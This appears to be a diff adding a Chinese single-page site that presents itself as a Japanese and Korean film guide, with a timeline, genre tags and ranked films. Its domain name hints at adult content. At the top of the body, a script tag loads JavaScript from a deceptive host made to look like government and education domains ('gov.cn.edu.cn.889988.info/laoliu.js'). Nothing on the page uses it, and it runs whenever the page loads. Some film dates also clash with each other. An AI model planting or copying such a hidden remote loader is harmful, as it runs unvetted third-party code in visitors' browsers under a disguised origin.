@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>日韩电影网 - 日韩影视资源导航 | rihanchengrendianyingwang-h5.github.io</title>
+<meta name="description" content="日韩电影网（https://rihanchengrendianyingwang-h5.github.io）专注日本、韩国影视资源导航，包含剧情、动漫、恐怖、爱情等全品类日韩影片推荐。">
+<meta name="keywords" content="日韩电影网,日本电影,韩国电影,日剧,韩剧,日韩影视,动漫,恐怖片">
+<meta name="author" content="日韩电影网">
+<meta name="robots" content="index,follow">
+<style>
+:root{
+  --washi:#faf8f3;
+  --sumi:#1a1a2e;
+  --ai-blue:#264e7a;
+  --shu-red:#c03221;
+  --take-green:#4a7c4f;
+  --gold:#b8953e;
+  --line:#d4cebc;
+  --radius:6px;
+  --sans:'Hiragino Sans GB','Microsoft YaHei',sans-serif;
+  --serif:'Noto Serif SC','Songti SC',serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  background:var(--washi);
+  color:var(--sumi);
+  font-family:var(--sans);
+  line-height:1.9;
+  font-size:15px;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 顶部 */
+header{
+  position:fixed;top:0;width:100%;z-index:100;
+  background:rgba(250,248,243,.95);
+  border-bottom:1px solid var(--line);
+  backdrop-filter:blur(8px);
+}
+.header-in{
+  max-width:1000px;margin:0 auto;
+  display:flex;justify-content:space-between;align-items:center;
+  padding:14px 20px;
+}
+.logo{
+  font-family:var(--serif);
+  font-size:20px;font-weight:900;
+  letter-spacing:2px;
+}
+.logo span{color:var(--shu-red)}
+.nav-toggle{display:none;font-size:22px;cursor:pointer;color:var(--sumi)}
+nav ul{display:flex;gap:28px;list-style:none}
+nav a{font-size:13px;font-weight:500;letter-spacing:1px;transition:.3s;position:relative}
+nav a::after{
+  content:"";position:absolute;bottom:-4px;left:0;width:0;height:1px;
+  background:var(--shu-red);transition:.3s;
+}
+nav a:hover::after{width:100%}
+nav a:hover{color:var(--shu-red)}
+
+/* 主容器 */
+main{max-width:1000px;margin:0 auto;padding:80px 20px 40px}
+
+/* 通用 */
+section{padding:60px 0;border-bottom:1px solid var(--line)}
+.section-tag{
+  font-size:11px;letter-spacing:4px;text-transform:uppercase;
+  color:var(--shu-red);margin-bottom:12px;font-weight:700;
+}
+.section-title{
+  font-family:var(--serif);font-size:32px;font-weight:900;
+  margin-bottom:8px;
+}
+.section-desc{color:#666;font-size:14px;margin-bottom:36px}
+
+/* 栏目1：首页 - 留白居中+竖排装饰 */
+#hero{
+  min-height:80vh;display:flex;align-items:center;justify-content:center;
+  text-align:center;position:relative;
+  border-bottom:1px solid var(--line);
+}
+.hero-jp{
+  position:absolute;right:20px;top:50%;transform:translateY(-50%);
+  writing-mode:vertical-rl;
+  font-family:var(--serif);font-size:14px;
+  color:var(--line);letter-spacing:8px;
+}
+.hero-kr{
+  position:absolute;left:20px;top:50%;transform:translateY(-50%);
+  writing-mode:vertical-rl;
+  font-family:var(--serif);font-size:14px;
+  color:var(--line);letter-spacing:8px;
+}
+.hero-content{position:relative;z-index:2;max-width:600px}
+.hero-title{
+  font-family:var(--serif);
+  font-size:clamp(2.2rem,6vw,4rem);
+  font-weight:900;line-height:1.1;margin-bottom:16px;
+}
+.hero-title .jp{color:var(--shu-red)}
+.hero-sub{font-size:16px;color:#555;margin-bottom:28px;font-style:italic}
+.hero-url{
+  display:inline-block;padding:12px 28px;
+  border:1.5px solid var(--sumi);border-radius:30px;
+  font-size:13px;font-family:monospace;
+  transition:.3s;
+}
+.hero-url:hover{background:var(--sumi);color:var(--washi)}
+.circle-stats{
+  display:flex;justify-content:center;gap:40px;margin-top:40px;
+}
+.circle{
+  text-align:center;
+}
+.circle-ring{
+  width:80px;height:80px;border-radius:50%;
+  border:3px solid var(--line);
+  display:flex;align-items:center;justify-content:center;
+  margin:0 auto 8px;
+  position:relative;
+}
+.circle-ring::before{
+  content:"";position:absolute;inset:-3px;border-radius:50%;
+  border:3px solid transparent;border-top-color:var(--shu-red);
+  transform:rotate(45deg);
+}
+.circle-num{font-size:18px;font-weight:900;font-family:var(--serif)}
+.circle-label{font-size:11px;color:#888;letter-spacing:1px}
+
+/* 栏目2：年份时间线 */
+#timeline{padding:60px 0}
+.timeline{position:relative;padding-left:40px}
+.timeline::before{
+  content:"";position:absolute;left:15px;top:0;bottom:0;
+  width:1px;background:var(--line);
+}
+.tl-year{
+  position:relative;margin-bottom:36px;
+}
+.tl-year::before{
+  content:"";position:absolute;left:-33px;top:8px;
+  width:12px;height:12px;border-radius:50%;
+  background:var(--shu-red);border:2px solid var(--washi);
+  box-shadow:0 0 0 3px rgba(192,50,33,.15);
+}
+.tl-year h3{
+  font-family:var(--serif);font-size:22px;margin-bottom:12px;
+}
+.tl-items{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px}
+.tl-card{
+  padding:14px;border:1px solid var(--line);border-radius:var(--radius);
+  transition:.3s;background:var(--washi);
+}
+.tl-card:hover{border-color:var(--ai-blue);box-shadow:0 4px 12px rgba(38,78,122,.1)}
+.tl-card h4{font-size:14px;margin-bottom:4px}
+.tl-card p{font-size:12px;color:#888}
+.tl-card .country{
+  display:inline-block;font-size:10px;padding:1px 8px;
+  border-radius:10px;margin-top:6px;
+}
+.cn-jp{background:#fde8e8;color:var(--shu-red)}
+.cn-kr{background:#e3e8f5;color:var(--ai-blue)}
+
+/* 栏目3：标签云瀑布 */
+#genres{padding:60px 0}
+.tag-waterfall{
+  display:flex;flex-wrap:wrap;gap:12px;justify-content:center;
+}
+.tag-bubble{
+  padding:14px 24px;
+  border:1.5px solid var(--line);border-radius:30px;
+  font-size:14px;font-weight:500;
+  transition:.3s;cursor:default;
+  position:relative;overflow:hidden;
+}
+.tag-bubble:hover{
+  transform:translateY(-3px);
+  border-color:var(--shu-red);
+  color:var(--shu-red);
+}
+.tag-bubble.lg{padding:18px 32px;font-size:16px}
+.tag-bubble.sm{padding:10px 18px;font-size:12px}
+.tag-bubble.red{background:rgba(192,50,33,.05);border-color:rgba(192,50,33,.2)}
+.tag-bubble.blue{background:rgba(38,78,122,.05);border-color:rgba(38,78,122,.2)}
+.tag-bubble.green{background:rgba(74,124,79,.05);border-color:rgba(74,124,79,.2)}
+.tag-bubble.gold{background:rgba(184,149,62,.05);border-color:rgba(184,149,62,.2)}
+
+/* 栏目4：圆形评分网格 */
+#top{padding:60px 0}
+.top-grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:24px;
+}
+.top-card{
+  display:flex;align-items:center;gap:16px;
+  padding:18px;border:1px solid var(--line);border-radius:var(--radius);
+  transition:.3s;
+}
+.top-card:hover{box-shadow:0 6px 20px rgba(0,0,0,.06)}
+.top-rank{
+  width:50px;height:50px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--serif);font-size:20px;font-weight:900;
+  flex-shrink:0;
+}
+.rank-1{background:var(--shu-red);color:#fff}
+.rank-2{background:var(--gold);color:#fff}
+.rank-3{background:var(--ai-blue);color:#fff}
+.rank-other{background:var(--line);color:var(--sumi)}
+.top-info h4{font-size:15px;margin-bottom:4px}
+.top-info p{font-size:12px;color:#888;margin-bottom:6px}
+.score-circle{
+  width:40px;height:40px;border-radius:50%;
+  border:3px solid var(--line);
+  display:flex;align-items:center;justify-content:center;
+  font-size:12px;font-weight:700;margin-left:auto;
+  flex-shrink:0;
+}
+.score-high{border-color:var(--shu-red);color:var(--shu-red)}
+.score-mid{border-color:var(--gold);color:var(--gold)}
+.score-low{border-color:var(--ai-blue);color:var(--ai-blue)}
+
+/* 栏目5：关于 - 和风分割 */
+#about{padding:60px 0;text-align:center}
+.wave-divider{
+  height:30px;
+  background:repeating-linear-gradient(
+    -45deg,
+    transparent,transparent 10px,
+    var(--line) 10px,var(--line) 11px
+  );
+  margin-bottom:40px;
+}
+.about-inner{max-width:600px;margin:0 auto}
+.about-inner h2{
+  font-family:var(--serif);font-size:26px;margin-bottom:16px;
+}
+.about-inner p{color:#555;margin-bottom:14px;font-size:14px}
+.seal{
+  display:inline-block;width:60px;height:60px;
+  border:3px solid var(--shu-red);
+  color:var(--shu-red);
+  font-family:var(--serif);font-size:14px;font-weight:900;
+  display:flex;align-items:center;justify-content:center;
+  border-radius:8px;
+  margin:24px auto 0;
+  transform:rotate(-5deg);
+}
+
+/* 页脚 */
+footer{
+  background:var(--sumi);color:var(--washi);
+  padding:40px 20px;text-align:center;
+}
+footer h4{font-family:var(--serif);font-size:18px;margin-bottom:10px}
+footer h4 span{color:var(--shu-red)}
+footer p{font-size:12px;color:#999;margin-bottom:6px}
+footer a{color:var(--gold)}
+.footer-nav{margin-top:20px;display:flex;justify-content:center;gap:20px;flex-wrap:wrap}
+.footer-nav a{font-size:12px;color:#ccc;transition:.3s}
+.footer-nav a:hover{color:var(--shu-red)}
+
+/* 移动端 */
+@media(max-width:768px){
+  .nav-toggle{display:block}
+  nav ul{
+    position:absolute;top:100%;left:0;right:0;
+    flex-direction:column;gap:0;
+    background:var(--washi);border-bottom:1px solid var(--line);
+    max-height:0;overflow:hidden;transition:.3s;
+  }
+  nav ul.open{max-height:300px}
+  nav ul li{border-top:1px solid var(--line)}
+  nav ul li a{display:block;padding:14px 20px}
+  nav ul li a::after{display:none}
+  .hero-jp,.hero-kr{display:none}
+  .circle-stats{gap:20px}
+  .circle-ring{width:60px;height:60px}
+  .circle-num{font-size:14px}
+  .tl-items{grid-template-columns:1fr}
+  .top-grid{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header>
+  <div class="header-in">
+    <div class="logo">日韩<span>电影网</span></div>
+    <div class="nav-toggle" onclick="document.querySelector('nav ul').classList.toggle('open')">☰</div>
+    <nav>
+      <ul>
+        <li><a href="#hero">首页</a></li>
+        <li><a href="#timeline">年代精选</a></li>
+        <li><a href="#genres">类型标签</a></li>
+        <li><a href="#top">口碑榜单</a></li>
+        <li><a href="#about">关于本站</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+<!-- 栏目1：首页 -->
+<section id="hero">
+  <div class="hero-jp">日本映画 · 極上の美学</div>
+  <div class="hero-kr">한국 영화 · 감성의 극치</div>
+  <div class="hero-content">
+    <div class="section-tag">JAPAN · KOREA CINEMA</div>
+    <h1 class="hero-title">日韩<span class="jp">电影</span>网</h1>
+    <p class="hero-sub">东瀛物哀之美 × 半岛现实之力 — 日韩影视资源导航与推荐</p>
+    <a href="#" class="hero-url">🌐 rihanchengrendianyingwang-h5.github.io</a>
+    <div class="circle-stats">
+      <div class="circle">
+        <div class="circle-ring"><span class="circle-num">2000+</span></div>
+        <div class="circle-label">收录影片</div>
+      </div>
+      <div class="circle">
+        <div class="circle-ring"><span class="circle-num">50+</span></div>
+        <div class="circle-label">分类标签</div>
+      </div>
+      <div class="circle">
+        <div class="circle-ring"><span class="circle-num">每日</span></div>
+        <div class="circle-label">更新推荐</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目2：年份时间线 -->
+<section id="timeline">
+  <div class="section-tag">— CHRONOLOGY —</div>
+  <h2 class="section-title">年代精选</h2>
+  <p class="section-desc">按年份轴梳理日韩经典影片</p>
+  <div class="timeline">
+    <div class="tl-year">
+      <h3>2024 — 年度力作</h3>
+      <div class="tl-items">
+        <div class="tl-card">
+          <h4>《完美的日子》</h4>
+          <p>维姆·文德斯执导，东京公厕清洁工的日常诗意。</p>
+          <span class="country cn-jp">日本</span>
+        </div>
+        <div class="tl-card">
+          <h4>《破墓》</h4>
+          <p>韩国风水师掘墓引发超自然事件，票房口碑双收。</p>
+          <span class="country cn-kr">韩国</span>
+        </div>
+        <div class="tl-card">
+          <h4>《哥斯拉-1.0》</h4>
+          <p>日本哥斯拉系列重启，奥斯卡最佳视觉效果。</p>
+          <span class="country cn-jp">日本</span>
+        </div>
+      </div>
+    </div>
+    <div class="tl-year">
+      <h3>2020-2023 — 口碑巅峰</h3>
+      <div class="tl-items">
+        <div class="tl-card">
+          <h4>《驾驶我的车》</h4>
+          <p>村上春树改编，奥斯卡最佳国际影片。</p>
+          <span class="country cn-jp">日本</span>
+        </div>
+        <div class="tl-card">
+          <h4>《寄生虫》</h4>
+          <p>奉俊昊导演，戛纳金棕榈+奥斯卡最佳影片。</p>
+          <span class="country cn-kr">韩国</span>
+        </div>
+        <div class="tl-card">
+          <h4>《在街上》</h4>
+          <p>今泉力哉日常系代表作，爵士乐与漫步。</p>
+          <span class="country cn-jp">日本</span>
+        </div>
+        <div class="tl-card">
+          <h4>《分手的决心》</h4>
+          <p>朴赞郁执导，戛纳最佳导演奖。</p>
+          <span class="country cn-kr">韩国</span>
+        </div>
+      </div>
+    </div>
+    <div class="tl-year">
+      <h3>2010-2019 — 黄金十年</h3>
+      <div class="tl-items">
+        <div class="tl-card">
+          <h4>《小偷家族》</h4>
+          <p>是枝裕和戛纳金棕榈获奖作。</p>
+          <span class="country cn-jp">日本</span>
+        </div>
+        <div class="tl-card">
+          <h4>《燃烧》</h4>
+          <p>李沧东导演，村上春树《烧仓房》改编。</p>
+          <span class="country cn-kr">韩国</span>
+        </div>
+        <div class="tl-card">
+          <h4>《你的名字。》</h4>
+          <p>新海诚现象级动画，全球票房破纪录。</p>
+          <span class="country cn-jp">日本</span>
+        </div>
+        <div class="tl-card">
+          <h4>《釜山行》</h4>
+          <p>延尚昊丧尸灾难片，亚洲丧尸片标杆。</p>
+          <span class="country cn-kr">韩国</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目3：标签云瀑布 -->
+<section id="genres">
+  <div class="section-tag">— CATEGORIES —</div>
+  <h2 class="section-title">类型标签</h2>
+  <p class="section-desc">点击探索不同风格的日韩影片</p>
+  <div class="tag-waterfall">
+    <span class="tag-bubble lg red">剧情 Drama</span>
+    <span class="tag-bubble blue">爱情 Romance</span>
+    <span class="tag-bubble green">动漫 Animation</span>
+    <span class="tag-bubble gold lg">恐怖 Horror</span>
+    <span class="tag-bubble sm red">悬疑 Mystery</span>
+    <span class="tag-bubble blue lg">犯罪 Crime</span>
+    <span class="tag-bubble green">动作 Action</span>
+    <span class="tag-bubble gold sm">喜剧 Comedy</span>
+    <span class="tag-bubble red">家庭 Family</span>
+    <span class="tag-bubble blue sm">历史 History</span>
+    <span class="tag-bubble green lg">社会 Social</span>
+    <span class="tag-bubble gold">青春 Youth</span>
+    <span class="tag-bubble s red">音乐 Music</span>
+    <span class="tag-bubble blue">战争 War</span>
+    <span class="tag-bubble green sm">纪录片 Doc</span>
+    <span class="tag-bubble gold">LGBTQ+</span>
+    <span class="tag-bubble red lg">独立 Independent</span>
+    <span class="tag-bubble blue sm">科幻 Sci-Fi</span>
+  </div>
+</section>
+
+<!-- 栏目4：圆形评分榜单 -->
+<section id="top">
+  <div class="section-tag">— TOP RANKINGS —</div>
+  <h2 class="section-title">口碑榜单</h2>
+  <p class="section-desc">综合评分最高的日韩影片推荐</p>
+  <div class="top-grid">
+    <div class="top-card">
+      <div class="top-rank rank-1">1</div>
+      <div class="top-info">
+        <h4>《寄生虫》</h4>
+        <p>2019 · 韩国 · 奉俊昊</p>
+      </div>
+      <div class="score-circle score-high">9.6</div>
+    </div>
+    <div class="top-card">
+      <div class="top-rank rank-2">2</div>
+      <div class="top-info">
+        <h4>《驾驶我的车》</h4>
+        <p>2021 · 日本 · 滨口龙介</p>
+      </div>
+      <div class="score-circle score-high">9.3</div>
+    </div>
+    <div class="top-card">
+      <div class="top-rank rank-3">3</div>
+      <div class="top-info">
+        <h4>《小偷家族》</h4>
+        <p>2018 · 日本 · 是枝裕和</p>
+      </div>
+      <div class="score-circle score-mid">9.1</div>
+    </div>
+    <div class="top-card">
+      <div class="top-rank rank-other">4</div>
+      <div class="top-info">
+        <h4>《燃烧》</h4>
+        <p>2018 · 韩国 · 李沧东</p>
+      </div>
+      <div class="score-circle score-mid">9.0</div>
+    </div>
+    <div class="top-card">
+      <div class="top-rank rank-other">5</div>
+      <div class="top-info">
+        <h4>《分手的决心》</h4>
+        <p>2022 · 韩国 · 朴赞郁</p>
+      </div>
+      <div class="score-circle score-mid">8.8</div>
+    </div>
+    <div class="top-card">
+      <div class="top-rank rank-other">6</div>
+      <div class="top-info">
+        <h4>《完美的日子》</h4>
+        <p>2023 · 日本 · 维姆·文德斯</p>
+      </div>
+      <div class="score-circle score-low">8.7</div>
+    </div>
+    <div class="top-card">
+      <div class="top-rank rank-other">7</div>
+      <div class="top-info">
+        <h4>《你的名字。》</h4>
+        <p>2016 · 日本 · 新海诚</p>
+      </div>
+      <div class="score-circle score-low">8.5</div>
+    </div>
+    <div class="top-card">
+      <div class="top-rank rank-other">8</div>
+      <div class="top-info">
+        <h4>《釜山行》</h4>
+        <p>2016 · 韩国 · 延尚昊</p>
+      </div>
+      <div class="score-circle score-low">8.4</div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目5：关于 -->
+<section id="about">
+  <div class="wave-divider"></div>
+  <div class="about-inner">
+    <div class="section-tag">— ABOUT —</div>
+    <h2>关于日韩电影网</h2>
+    <p>日韩电影网（https://rihanchengrendianyingwang-h5.github.io）是一个专注于日本、韩国影视资源的导航与推荐站点。</p>
+    <p>从日本物哀美学的文艺片，到韩国社会现实的犯罪片，我们致力于为影迷提供有深度的分类和推荐。</p>
+    <p>本站为单页演示，内链以 # 占位，不生成 robots.txt / sitemap.xml。</p>
+    <div class="seal">日韓<br>映画</div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <h4>日韩<span>电影网</span></h4>
+  <p>日本映画 × 韩国영화 · 影视资源导航站</p>
+  <p>官网：<a href="https://rihanchengrendianyingwang-h5.github.io">rihanchengrendianyingwang-h5.github.io</a></p>
+  <p style="margin-top:12px;font-size:11px;color:#666">单页演示 · 内链 # 占位 · 无 robots.txt / sitemap.xml</p>
+  <div class="footer-nav">
+    <a href="#">首页 #</a>
+    <a href="#">分类 #</a>
+    <a href="#">榜单 #</a>
+    <a href="#">关于 #</a>
+    <a href="#">投稿 #</a>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('nav a').forEach(a=>{
+  a.addEventListener('click',()=>{
+    if(window.innerWidth<=768)document.querySelector('nav ul').classList.remove('open');
+  });
+});
+</script>
+</body>
+</html>
